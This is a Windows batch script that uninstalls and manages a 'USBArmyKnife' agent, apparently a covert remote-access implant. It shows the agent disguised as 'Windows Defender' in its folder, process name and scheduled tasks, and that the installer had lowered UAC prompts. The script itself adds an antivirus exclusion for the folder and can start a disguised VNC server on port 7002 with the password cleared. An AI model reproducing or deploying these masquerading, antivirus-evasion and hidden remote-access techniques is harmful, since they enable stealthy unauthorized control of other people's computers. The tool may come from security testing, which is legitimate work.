REM SPDX-License-Identifier: MIT
@echo off
setlocal EnableExtensions EnableDelayedExpansion
title USBArmyKnife Agent Uninstaller

set "DEST=C:\ProgramData\Windows Defender"
set "STARTUP=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Administrator privileges required...
    powershell -Command "Start-Process -FilePath '%~f0' -Verb RunAs"
    exit /b
)

for %%I in ("%~f0") do set "SRC_DIR=%%~dI%%~pI"
for %%I in ("%TEMP%") do set "SHORTTEMP=%%~sI"
if not "%SRC_DIR%"=="%SHORTTEMP%\" (
    copy /y "%~f0" "%SHORTTEMP%\USBArmyKnife_Uninstall.bat" >nul 2>&1
    start "" /min powershell -NoProfile -Command "Start-Process cmd -ArgumentList '/c \"%SHORTTEMP%\USBArmyKnife_Uninstall.bat\"' -Verb RunAs"
    exit
)

:show_menu
set "VNC_RUNNING=0"
tasklist /FI "IMAGENAME eq Windows Defender.exe" 2>nul | find /i "Windows Defender.exe" >nul 2>&1
if %errorlevel% equ 0 set "VNC_RUNNING=1"

cls
echo.
echo ========================================
echo   USBArmyKnife Agent Uninstaller
echo ========================================
echo.
echo   [1] Full Uninstall
echo       Removes autostart, all files and firewall rules.
echo.

if "%VNC_RUNNING%"=="1" (
    echo   [2] Stop VNC Server
    echo       VNC Server is running on port 7002.
) else (
    echo   [2] Start VNC Server
    echo       VNC Server is not running.
)
echo.

if "%VNC_RUNNING%"=="1" (
    echo   [3] Change VNC Password
) else (
    echo   [3] Set VNC Password
)
echo.

echo   [4] Exit
echo.
echo ========================================
echo.

set /p "CHOICE=Select option (1-4): "
if "%CHOICE%"=="1" goto UNINSTALL_ALL
if "%CHOICE%"=="2" goto TOGGLE_VNC
if "%CHOICE%"=="3" goto MANAGE_PASSWORD
if "%CHOICE%"=="4" exit /b 0
echo Invalid input.
timeout /t 2 /nobreak >nul
goto show_menu

:UNINSTALL_ALL
echo.
echo === Full Uninstall ===
echo.

echo [1/5] Stopping processes...
taskkill /F /IM AgentLauncher.exe >nul 2>&1
powershell -NoProfile -Command "Get-Process -Name 'Windows Defender' -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue"
timeout /t 2 /nobreak >nul
echo    Done.

echo [2/5] Removing autostart...
del "%STARTUP%\USBArmyKnifeAgent.vbs" >nul 2>&1
del "%STARTUP%\VncDirect.vbs" >nul 2>&1
del "%DEST%\WinDefend.vbs" >nul 2>&1
del "%DEST%\WinDefend.ps1" >nul 2>&1
schtasks /delete /tn "USBArmyKnife Agent" /f >nul 2>&1
schtasks /delete /tn "Security Script" /f >nul 2>&1
schtasks /delete /tn "Windows Defender" /f >nul 2>&1
schtasks /delete /tn "VNC Watchdog" /f >nul 2>&1
schtasks /delete /tn "VNC Direct" /f >nul 2>&1
schtasks /delete /tn "VNC Direct User" /f >nul 2>&1
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "VNC Direct" /f >nul 2>&1
echo    Done.

echo [3/5] Removing firewall rules...
netsh advfirewall firewall delete rule name="VNC Direct 7002" >nul 2>&1
netsh advfirewall firewall delete rule name="VNC Block Localhost" >nul 2>&1
netsh advfirewall firewall delete rule name="VNC Block Localhost v6" >nul 2>&1
echo    Done.

echo [4/5] Re-enabling UAC...
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 5 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v PromptOnSecureDesktop /t REG_DWORD /d 1 /f >nul 2>&1
echo    Done.

echo [5/5] Deleting folder...
powershell -NoProfile -Command "Add-MpPreference -ExclusionPath 'C:\ProgramData\Windows Defender' -ErrorAction SilentlyContinue"
rmdir /s /q "%DEST%" >nul 2>&1
if not exist "%DEST%" (
    echo    Folder deleted.
) else (
    echo    Folder locked by Windows Defender. Scheduling cleanup on next boot...
    schtasks /delete /tn "USBArmyKnife Cleanup" /f >nul 2>&1
    schtasks /create /tn "USBArmyKnife Cleanup" /tr "cmd.exe /c rmdir /s /q C:\ProgramData\Windows Defender" /sc onstart /ru SYSTEM /rl highest /f >nul 2>&1
    echo    Cleanup scheduled. Folder will be removed after restart.
)

echo.
echo ========================================
echo   Uninstall complete!
echo ========================================
echo.
echo Window closes in 5 seconds...
timeout /t 5 /nobreak >nul
exit /b 0

:TOGGLE_VNC
if "%VNC_RUNNING%"=="1" goto STOP_VNC
goto START_VNC

:START_VNC
echo.
echo === Starting VNC Server ===
echo.
if not exist "%DEST%\VncDirect\Windows Defender.exe" (
    echo    Windows Defender.exe not found. Run installer first.
    pause
    goto show_menu
)
start "" "%DEST%\VncDirect\Windows Defender.exe" port=7002 "cwd=%DEST%\VncDirect\vnc" fps=360 scale=0
timeout /t 3 /nobreak >nul
echo    VNC Server started.
echo.
echo ========================================
for /f %%a in ('powershell -NoProfile -Command "Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -like '192.168.*' -and $_.IPAddress -notlike '192.168.56.*' } | Select-Object -First 1 -ExpandProperty IPAddress"') do (
    set "IP=%%a"
    goto gotip_s
)
for /f "tokens=2 delims=:" %%a in ('ipconfig ^| findstr /r "IPv4"') do ( set "IP=%%a" & goto gotip_s )
:gotip_s
set "IP=%IP: =%"
echo   VNC URL: http://%IP%:7002/
echo ========================================
timeout /t 3 /nobreak >nul
goto show_menu

:STOP_VNC
echo.
echo === Stopping VNC Server ===
echo.
powershell -NoProfile -Command "Get-Process -Name 'Windows Defender' -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue"
timeout /t 1 /nobreak >nul
echo    VNC Server stopped.
goto show_menu

:MANAGE_PASSWORD
echo.
echo === VNC Password ===
echo.
echo Enter new password (leave empty to clear):
echo.
set "NEWPASS="
set /p "NEWPASS=Password: "

echo.
echo Stopping VNC server...
powershell -NoProfile -Command "Get-Process -Name 'Windows Defender' -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue"
timeout /t 2 /nobreak >nul

if not "%NEWPASS%"=="" (
    echo Saving password...
    powershell -NoProfile -Command "$j = @{}; if (Test-Path '%DEST%\VncDirect\vnc-settings.json') { try { $raw = Get-Content '%DEST%\VncDirect\vnc-settings.json' -Raw; $obj = $raw | ConvertFrom-Json; foreach ($p in $obj.PSObject.Properties) { $j[$p.Name] = $p.Value } } catch {} }; $j['password'] = '%NEWPASS%'; $j | ConvertTo-Json | Set-Content '%DEST%\VncDirect\vnc-settings.json' -Encoding UTF8"
    echo    Password saved.
) else (
    echo Clearing password...
    powershell -NoProfile -Command "$j = @{}; if (Test-Path '%DEST%\VncDirect\vnc-settings.json') { try { $raw = Get-Content '%DEST%\VncDirect\vnc-settings.json' -Raw; $obj = $raw | ConvertFrom-Json; foreach ($p in $obj.PSObject.Properties) { $j[$p.Name] = $p.Value } } catch {} }; $j['password'] = ''; $j | ConvertTo-Json | Set-Content '%DEST%\VncDirect\vnc-settings.json' -Encoding UTF8"
    echo    Password cleared.
)

echo.
echo Restarting VNC server...
timeout /t 1 /nobreak >nul
if exist "%DEST%\VncDirect\Windows Defender.exe" (
    start "" "%DEST%\VncDirect\Windows Defender.exe" port=7002 "cwd=%DEST%\VncDirect\vnc" fps=360 scale=0
    echo    VNC server restarted.
) else (
    echo    VNC server not found.
)
timeout /t 2 /nobreak >nul
goto show_menu
